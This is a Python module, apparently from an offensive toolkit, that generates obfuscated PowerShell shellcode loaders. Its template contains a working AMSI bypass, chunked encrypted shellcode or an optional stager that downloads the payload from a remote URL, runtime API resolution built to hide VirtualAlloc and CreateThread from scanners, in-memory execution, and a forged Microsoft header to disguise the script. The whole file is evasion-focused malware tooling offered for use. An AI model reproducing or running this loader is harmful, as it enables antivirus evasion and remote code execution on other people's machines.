"""
PowerShell loader generator.

Produces a .ps1 script containing:
  - AMSI bypass (obfuscated)
  - Encrypted shellcode array (chunked)
  - Decryption stubs for the full chain
  - VirtualAlloc + GetDelegateForFunctionPointer execution
  - Optional Chimera-style obfuscation
"""

import random
from ..utils import random_variable_name, split_into_chunks, bytes_to_ps1_array
from ..chain import decryption_stubs_ps1
from ..obfuscation import obfuscate_powershell, generate_microsoft_header


def _chunked_ps1_string(value: str) -> str:
    """Build a PowerShell expression that reassembles `value` from random
    2-4 char chunks, so the literal value (e.g. 'VirtualAlloc') never appears
    in the generated source – it only exists once reassembled at runtime."""
    parts = []
    i = 0
    while i < len(value):
        n = random.randint(2, 4)
        parts.append(value[i:i + n])
        i += n
    return '(' + ' + '.join(f'"{p}"' for p in parts) + ')'


def generate(encrypted_bytes: bytes,
             chain_metadata: list[dict],
             obfuscation_level: int = 3,
             enable_obfuscation: bool = True,
             enable_debug: bool = False,
             staged_url: str | None = None) -> str:
    """
    Build a complete PowerShell loader script.

    Args:
        encrypted_bytes:   Final encrypted shellcode (after full chain).
        chain_metadata:    Per-stage metadata list from chain.apply_chain().
        obfuscation_level: 1-5 (Chimera-style).
        enable_obfuscation: Whether to run the obfuscation pass.
        enable_debug:       Emit Write-Host diagnostics.
        staged_url:         If set, the .ps1 becomes a small stager that
                            downloads the encrypted blob from this URL and
                            decrypts it in memory, instead of embedding the
                            shellcode (the caller writes the .bin separately).

    Returns:
        Complete .ps1 source string.
    """
    # ---- shellcode source (embedded or staged download) -----------------
    if staged_url:
        # Staged mode: no embedded shellcode.  Download the encrypted blob over
        # HTTP and assign it to $encrypted; the rest of the loader (decryption
        # stubs + execution core) is identical to the embedded path.
        url_expr = _chunked_ps1_string(staged_url)
        shellcode_block = (
            f'$url = {url_expr}\n'
            f'[Byte[]] $encrypted = (New-Object System.Net.WebClient).DownloadData($url)'
        )
    else:
        chunks = split_into_chunks(encrypted_bytes)
        chunk_defs = []
        chunk_names = []
        for var, chunk in chunks:
            hex_arr = bytes_to_ps1_array(chunk)
            chunk_defs.append(f'[Byte[]] ${var} = {hex_arr}')
            chunk_names.append(f'${var}')
        concat_line = f'[Byte[]] $encrypted = {" + ".join(chunk_names)}'
        shellcode_block = '\n'.join(chunk_defs) + '\n\n' + concat_line

    # ---- decryption stubs ------------------------------------------------
    helpers, exec_code = decryption_stubs_ps1(chain_metadata)
    helper_block = '\n'.join(helpers)

    # ---- execution names (obfuscated) ------------------------------------
    # APIs are resolved at runtime via GetProcAddress, so the high-value names
    # (VirtualAlloc / CreateThread / WaitForSingleObject) never appear as
    # plaintext DllImport entry points – they are reassembled from chunks.
    cls_name      = random_variable_name(random.randint(10, 20))
    load_name     = random_variable_name(random.randint(10, 20))
    getproc_name  = random_variable_name(random.randint(10, 20))
    dll_p1    = random_variable_name(random.randint(8, 15))
    dll_p2    = random_variable_name(random.randint(8, 15))
    dll_p3    = random_variable_name(random.randint(8, 15))
    dll_p4    = random_variable_name(random.randint(8, 15))
    using1    = random_variable_name(random.randint(15, 25))
    using2    = random_variable_name(random.randint(15, 25))
    dll_mod   = _chunked_ps1_string("kernel32.dll")
    va_name   = _chunked_ps1_string("VirtualAlloc")
    ct_name   = _chunked_ps1_string("CreateThread")
    wf_name   = _chunked_ps1_string("WaitForSingleObject")

    # ---- debug block -----------------------------------------------------
    if enable_debug:
        debug_block = (
            'Write-Host "[DEBUG] Encrypted: $($encrypted.Length) bytes"\n'
            'Write-Host "[DEBUG] Decrypted: $($buf.Length) bytes"'
        )
    else:
        debug_block = ''

    script = _TEMPLATE.format(
        shellcode_block=shellcode_block,
        helper_block=helper_block,
        exec_code=exec_code,
        debug_block=debug_block,
        cls_name=cls_name,
        load_name=load_name,
        getproc_name=getproc_name,
        dll_p1=dll_p1,
        dll_p2=dll_p2,
        dll_p3=dll_p3,
        dll_p4=dll_p4,
        using1=using1,
        using2=using2,
        dll_mod=dll_mod,
        va_name=va_name,
        ct_name=ct_name,
        wf_name=wf_name,
    )

    if enable_obfuscation:
        script = obfuscate_powershell(script, level=obfuscation_level)

    print("[*] Adding Microsoft PowerShell header...")
    return generate_microsoft_header() + script


# ---------------------------------------------------------------------------
# Template  (uses {{}} for literal PS braces)
# ---------------------------------------------------------------------------

_TEMPLATE = """\
$g = "Amsi"
$c = "Utils"
$ref = $g + $c
try {{
    $a = [Ref].Assembly.GetType("System.Management.Automation.$ref")
    $b = $a.GetField('amsiInitFailed','NonPublic,Static')
    $b.SetValue($null,$true)
}} catch {{}}

{shellcode_block}

{helper_block}

{exec_code}

{debug_block}

if ($buf.Length -eq 0) {{ exit }}

${using1} = "usi" + "ng Sys" + "tem;"
${using2} = "usi" + "ng Sys" + "tem.Run" + "time.Int" + "eropSer" + "vices;"
$Marshal = [System.Runtime.InteropServices.Marshal]

$Native = ${using1} + "`n" + ${using2} + "`n" + @"
public static class {cls_name} {{
    private const string {dll_p1} = "ker";
    private const string {dll_p2} = "nel";
    private const string {dll_p3} = "32.";
    private const string {dll_p4} = "dll";
    [DllImport({dll_p1} + {dll_p2} + {dll_p3} + {dll_p4}, EntryPoint = "LoadLibrary")]
    public static extern IntPtr {load_name}(string p);
    [DllImport({dll_p1} + {dll_p2} + {dll_p3} + {dll_p4}, EntryPoint = "GetProcAddress")]
    public static extern IntPtr {getproc_name}(IntPtr h, string n);
}}
"@

$Win32 = Add-Type -TypeDefinition $Native -PassThru

$h = [{cls_name}]::{load_name}({dll_mod})
$va = $Marshal::GetDelegateForFunctionPointer([{cls_name}]::{getproc_name}($h, {va_name}), [Func[IntPtr, uint32, uint32, uint32, IntPtr]])
$ct = $Marshal::GetDelegateForFunctionPointer([{cls_name}]::{getproc_name}($h, {ct_name}), [Func[IntPtr, uint32, IntPtr, IntPtr, uint32, IntPtr, IntPtr]])
$wf = $Marshal::GetDelegateForFunctionPointer([{cls_name}]::{getproc_name}($h, {wf_name}), [Func[IntPtr, uint32, uint32]])

$size = $buf.Length
$ptr = $va.Invoke([IntPtr]::Zero, [uint32]$size, [uint32](0x1000 + 0x2000), [uint32](0x20 + 0x20))
if ($ptr -eq [IntPtr]::Zero) {{ exit }}
$Marshal::Copy($buf, 0, $ptr, $size)
$hThread = $ct.Invoke([IntPtr]::Zero, [uint32]0, $ptr, [IntPtr]::Zero, [uint32]0, [IntPtr]::Zero)
$wf.Invoke($hThread, [uint32]0xFFFFFFFF) | Out-Null
"""
